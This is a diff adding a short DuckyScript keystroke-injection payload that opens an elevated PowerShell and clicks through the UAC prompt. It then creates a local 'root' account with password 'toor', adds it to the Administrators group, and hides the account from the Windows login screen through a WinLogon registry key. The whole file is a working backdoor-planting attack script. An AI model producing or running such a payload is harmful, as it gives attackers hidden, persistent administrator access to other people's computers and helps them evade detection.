@@ -1,0 +1,19 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Create a new Windows-User with Admin perms.
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 560
+LEFTARROW
+ENTER
+DELAY 560
+ALT y
+DELAY 300
+STRING Net User root toor  /ADD;Net LocalGroup Administrators root  /ADD;Net LocalGroup Administrator root  /ADD;Net LocalGroup Administratoren root  /ADD;reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList' /v root /t REG_DWORD /d 0 /f; exit
+ENTER
